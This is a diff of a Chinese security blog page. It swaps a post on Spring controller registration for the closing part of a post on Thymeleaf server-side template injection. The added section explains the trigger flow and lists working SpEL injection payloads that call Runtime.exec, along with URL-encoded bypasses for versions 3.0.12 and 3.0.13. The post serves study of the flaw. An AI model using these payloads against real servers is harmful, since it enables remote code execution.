+<p>另外还有几个小版本的绕过，深入研究的意义也不是很大，总体是学习一下整个JAVA SSTI的触发流程</p>
+<p>整个SSTI触发的流程：</p>
+<p>ha.handle完成了交给Controller处理、取出参数作为viewName；如果参数没取到viewName，则将URL path作为viewName；解析的时候如果遇到<code>::</code>会进行片段表达式的解析，即先后用org.thymeleaf.standard.expression.Expression#execute去处理，进而触发spEL表达式注入</p>
+<p>重点在于Controller接口具有视图渲染功能，如果用RestController或者给Controller加上ResponseBody就失去了视图渲染功能，就不会触发漏洞</p>
+<p>&lt;&#x3D;3.0.11 payload：</p>
 <ul>
-<li><strong>基于 <code>@ComponentScan</code></strong></li>
-<li><strong>基于 <code>context:component-scan</code>（XML 配置）</strong></li>
+<li>参数型：</li>
 </ul>
-<p>其实Spring Boot 应用的 <code>@SpringBootApplication</code> 都是 <code>@ComponentScan</code> 的一个封装</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">@SpringBootApplication</span>  <span class="comment">// 等同于 @ComponentScan(basePackages = &quot;com.example&quot;)</span></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyApplication</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      SpringApplication.run(MyApplication.class, args);</span><br><span class="line">  &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=__$&#123;<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
 
-<p>默认情况下，它会扫描 <strong>当前类所在的包及其子包</strong>，所以通常 <code>SpringBootApplication</code> 类应该放在 <strong>根包</strong> 位置</p>
-</blockquote>
-<p>但是如果了解过spring的，会记得Bean的依赖注入依靠的是@Autowired注解，那么没有@Autowired注解的spring创建Bean是怎样的？</p>
-<p><code>AbstractAutowireCapableBeanFactory</code> 是 Spring Bean 容器中的核心类，它负责 <strong>创建 Bean 并处理依赖注入</strong>。</p>
-<p><strong>Spring 在创建所有 Bean 时，都会经过 <code>AbstractAutowireCapableBeanFactory</code> 进行依赖注入，即使该 Bean 没有 <code>@Autowired</code> 注解</strong></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310103843845.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310103843845.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310103843845"></p>
-<p>所以我们把断点打到AbstractAutowireCapableBeanFactory.createBean，看看怎么把Controller这个bean注册进容器的</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310104439827.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310104439827.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310104439827"></p>
-<p>调用了doCreateBean</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310104525405.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310104525405.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310104525405"></p>
-<p>在CreateBean内先是创建了RequestMappingHandlerMapping</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310110320763.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310110320763.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310110320763"></p>
-<p>然后调用了populateBean和initializeBean</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310104819998.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310104819998.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310104819998"></p>
-<p>跟进到populateBean内，可以看到有根据NAME或者TYPE进行autowired装配</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310105009938.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310105009938.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310105009938"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310105259623.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310105259623.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310105259623"></p>
-<p>这里我们没有@Autowired标记自动装配的字段，所以populateBean实际上什么都没做就返回了</p>
-<p>跟进initializeBean，调用了invokeInitMethods</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310115311253.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310115311253.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310115311253"></p>
-<p>然后调用bean.afterPropertiesSet，这里bean是上面实例化的RequestMappingHandlerMapping</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310120330264.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310120330264.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310120330264"></p>
-<p>在RequestMappingHandlerMapping.afterPropertiesSet内，config配置了一堆东西。这里就算把RequestMappingHandlerMapping装配好了。然后调用父类的afterPropertiesSet</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310120419395.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310120419395.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310120419395"></p>
-<p>调用initHandlerMethods</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310144522272.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310144522272.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310144522272"></p>
-<p>getCandidateBeanNames获取候选beanName，循环调用processCandidateBean</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310144810781.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310144810781.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310144810781"></p>
-<p>在processCandidateBean内，如果isHandler(beanType)为true，会调用detectHandlerMethods</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310145015655.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310145015655.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310145015655"></p>
-<p>跟进到isHandler，就是判断beanType是否用了@Controller注解或者@RequestMapping注解装饰</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310145108104.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310145108104.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310145108104"></p>
-<p>用了@Controller注解装饰，所以进入detectHandlerMethods</p>
-<p>在该方法内，调用getMappingForMethod根据方法和类级别的 @RequestMapping 注解创建 RequestMappingInfo</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310145358853.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310145358853.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310145358853"></p>
-<p>如果存在类级别的 RequestMappingInfo，则将其与方法级别的合并。</p>
-<blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">@RestController</span></span><br><span class="line">&gt;<span class="meta">@RequestMapping(&quot;/api&quot;)</span>  <span class="comment">// 类级别的映射</span></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyController</span> &#123;</span><br><span class="line"></span><br><span class="line">&gt;<span class="meta">@RequestMapping(&quot;/hello&quot;)</span>  <span class="comment">// 方法级别的映射</span></span><br><span class="line">&gt;<span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;Hello, Spring!&quot;</span>;</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如上完整路径是 <strong><code>/api/hello</code></strong></p>
-</blockquote>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310150404557.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310150404557.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310150404557"></p>
-<p>然后调用MethodIntrospector.selectMethods获取了对应的方法，最后封装如下</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310150908280.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310150908280.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310150908280"></p>
-<p>然后是循环调用registerHandlerMethod注册方法</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310150940307.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310150940307.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310150940307"></p>
-<p>RequestMappingHandlerMapping.registerHandlerMethod调用了父类的该方法</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310151109422.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310151109422.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310151109422"></p>
-<p>AbstractHandlerMethodMapping.registerHandlerMethod调用内部类this.mappingRegistry(AbstractHandlerMethodMapping$MappingRegistry)的register方法</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310151046492.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310151046492.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310151046492"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310151244604.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310151244604.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310151244604"></p>
-<p>register把映射的url和对应的方法注册进了AbstractHandlerMethodMapping$MappingRegistry。关键在于装填了mappingLookup和urlLookup。这样在访问index路由时，就能找到需要调用的方法。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310155833525.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310155833525.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310155833525"></p>
-<p>下面是已经装配好的registry</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310155916892.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250310155916892.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250310155916892"></p>
-<p>理论上来说，直接调用register就能完成把Controller方法注册进spring内。</p>
-<h2 id="三种Controller注册方式"><a href="#三种Controller注册方式" class="headerlink" title="三种Controller注册方式"></a>三种Controller注册方式</h2><p>也就是说，用@Controller或者@RequestMapping注解的才会用RequestMappingHandlerMapping注册进去。</p>
-<p>那么问题来了，创建Controller的方式不止注解一种方式，一共有以下三种方式：</p>
+<p>可以去掉<code>.x</code>，可以去掉两遍的双下划线，可以在前面加<code>\</code></p>
 <ul>
-<li>方法一：直接使用Controller注解</li>
+<li>URL型：</li>
 </ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了避免提前识别为文件后缀，后面的<code>.x</code>不能省</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=__$&#123;<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
 
-<p>现在最最最常见的用法，99% Controller都是这么写的</p>
-<ul>
-<li>方法二：实现Controller接口，实现handleRequest方法。用Component注解进行映射</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component(&quot;/home&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HomeController</span> <span class="keyword">implements</span> <span class="title class_">Controller</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">                                      HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;home ...&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;home controller from body&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=\__$&#123;<span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>).getInputStream()).next()&#125;__::.x</span><br></pre></td></tr></table></figure>
 
-<p>这种方式属于 Spring 早期的 <strong>XML 配置风格</strong>，现在很少使用。</p>
-<ul>
-<li>方法三：实现HttpRequestHandler接口，实现handleRequest方法。用Component注解进行映射</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component(&quot;/login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginController</span> <span class="keyword">implements</span> <span class="title class_">HttpRequestHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleRequest</span><span class="params">(HttpServletRequest request, </span></span><br><span class="line"><span class="params">    		HttpServletResponse response)</span> </span><br><span class="line">    		<span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;login...&quot;</span>);</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;login ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>高版本Bypass：<a target="_blank" rel="noopener" href="http://byname6.cn/index.php/2024/10/25/springboot%E4%B8%8B%E7%9A%84thymeleaf%E5%85%A8%E7%89%88%E6%9C%ACssti%E7%A0%94%E7%A9%B6/#header-id-14">http://byname6.cn/index.php/2024/10/25/springboot%E4%B8%8B%E7%9A%84thymeleaf%E5%85%A8%E7%89%88%E6%9C%ACssti%E7%A0%94%E7%A9%B6/#header-id-14</a></p>
+<p>由于利用价值不大，在此了解payload即可</p>
+<p>&#x3D;3.0.12 Bypass：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__%<span class="number">24</span>%7b%00new+java.util.Scanner(T+(java.lang.Runtime).getRuntime().exec(%22calc.exe%<span class="number">22</span>).getInputStream()).next()%7d__</span><br></pre></td></tr></table></figure>
 
+<p>&#x3D;3.0.13 Bypass：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">24</span>%7b%00new+java.util.Scanner(%00T(java.lang.Runtime).getRuntime().exec(%22calc.exe%<span class="number">22</span>).getInputStream()).next()%<span class="number">7d</span></span><br></pre></td></tr></table></figure>
 
-
-<p>方法一用RequestMappingHandlerMapping和RequestMappingHandlerAdapter去处理</p>
-<p>方法二同样的循环中会进入RequestMappingHandlerMapping</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325122327525.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325122327525.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250325122327525"></p>
-<p>但是因为没有注册的原因，getHandler从mappingLookup和urlLookup中取不到值，于是返回null</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325122351418.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325122351418.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250325122351418"></p>
-<p>于是用<code>BeanNameUrlHandlerMapping</code>去实例化，对应的Adapter是SimpleControllerHandlerAdapter</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325122758885.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325122758885.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250325122758885"></p>
-<p>方法三用的BeanNameUrlHandlerMapping，对应的Adapter是HttpRequestHandlerAdapter</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325123033486.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250325123033486.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250325123033486"></p>
-<p>到这里可以做个总结：</p>
-<table>
-<thead>
-<tr>
-<th>HandlerMapping</th>
-<th>使用范围</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>RequestMappingHandlerMapping</td>
-<td>用@Controller或者@RequestMapping注解注册的Controller</td>
-</tr>
-<tr>
-<td>BeanNameUrlHandlerMapping</td>
-<td>实现Controller接口或者实现HttpRequestHandler接口注册的Controller</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>HandlerAdapter</th>
-<th>使用范围</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>RequestMappingHandlerAdapter</td>
-<td>用@Controller或者@RequestMapping注解注册的Controller</td>
-</tr>
-<tr>
-<td>SimpleControllerHandlerAdapter</td>
-<td>实现Controller接口</td>
-</tr>
-<tr>
-<td>HttpRequestHandlerAdapter</td>
-<td>实现HttpRequestHandler接口</td>
-</tr>
-</tbody></table>
-<p>之所以要如此设计，可以观察Controller接口、HttpRequestHandler接口的handleRequest方法。一个返回ModelAndView，一个返回void。说明Controller接口具有视图渲染功能，HttpRequestHandler接口却没有。</p>
-<p>正是因为对应的处理不同，所以选择了不同的Adapter去进行相应处理</p>
-<p>为什么如此重视这个设计？因为此设计关乎上述的自动视图渲染功能，而此功能在后续分析java ssti漏洞至关重要</p>
+<p>大于3.0.14 G</p>
+<p>ref：</p>
+<p><a target="_blank" rel="noopener" href="http://byname6.cn/index.php/2024/10/25/springboot%E4%B8%8B%E7%9A%84thymeleaf%E5%85%A8%E7%89%88%E6%9C%ACssti%E7%A0%94%E7%A9%B6/">http://byname6.cn/index.php/2024/10/25/springboot%E4%B8%8B%E7%9A%84thymeleaf%E5%85%A8%E7%89%88%E6%9C%ACssti%E7%A0%94%E7%A9%B6/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/9962?time__1311=QqGx2DcDRQDtG=D/YrqBKD=3dxmqSEuA2fbD&u_atoken=8e8ced3e76ca58d63707c98da3afe609&u_asig=1a0c399d17427095712908584e0038">https://xz.aliyun.com/news/9962?time__1311=QqGx2DcDRQDtG%3DD%2FYrqBKD%3D3dxmqSEuA2fbD&amp;u_atoken=8e8ced3e76ca58d63707c98da3afe609&amp;u_asig=1a0c399d17427095712908584e0038</a></p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/spring/" class="">
-              spring
+            <a href="/tags/Thymeleaf/" class="">
+              Thymeleaf
             </a>
           
         </div>
@@ -832,7 +955,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2025/03/25/spring-dispatcherservlet-xiang-jie/" target="_blank" title="DispatcherServlet.doDispatch请求分发详解">https://godownio.github.io/2025/03/25/spring-dispatcherservlet-xiang-jie/</a>
+    <a href="/2025/04/28/java-thymeleaf-ssti-spel/" target="_blank" title="Java Thymeleaf SSTI(本质为SpEL)">https://godownio.github.io/2025/04/28/java-thymeleaf-ssti-spel/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -850,45 +973,23 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8141.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8141.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2025/03/25/chang-yong-de-er-ci-fan-xu-lie-hua-gong-ji/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">常用的二次反序列化攻击</div>
-      </div>
-      
-      <!-- <div class="content">
-        一些链被黑名单ban了，可以用二次反序列化绕过，比如JRMP
-JRMPJDK&lt;8U241
-JRMP打RMI，在ys
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8139.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8139.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8151.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8151.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2025/03/20/htb-shua-ti-ji-lu/" class="post-nav-link">
+    <a href="/2025/04/23/resin-fan-xu-lie-hua/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">HTB 第七期 Escapetwo</div>
+        <div class="title-text">Resin反序列化JNDI</div>
       </div>
       <!-- <div class="content">
-        不会内网渗透，被面试官狠狠羞辱
-难受死了，刷HTB来了，放弃治疗
-VPN用的欧盟+TCP，美国的似乎用不了
-
-HTB第七
+        resin反序列化其他洞学累了，学会儿愉快的反序列化拼拼乐吧
+pom：
+12345&lt;dependency&gt; 
       </div> -->
     </a>
   </div>
@@ -1109,7 +1210,7 @@ HTB第七
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DispatcherServlet-doDispatch%E8%AF%A6%E8%A7%A3"><span class="toc-text">DispatcherServlet.doDispatch详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#doDispatch%E6%B5%81%E7%A8%8B"><span class="toc-text">doDispatch流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8CController"><span class="toc-text">注册Controller</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E7%A7%8DController%E6%B3%A8%E5%86%8C%E6%96%B9%E5%BC%8F"><span class="toc-text">三种Controller注册方式</span></a></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-Thymeleaf-SSTI"><span class="toc-text">Java Thymeleaf SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Thymeleaf%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80"><span class="toc-text">Thymeleaf的一些基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE"><span class="toc-text">标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-text">原理解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%83%85%E6%8F%90%E8%A6%81"><span class="toc-text">前情提要</span></a></li><li class="toc-item 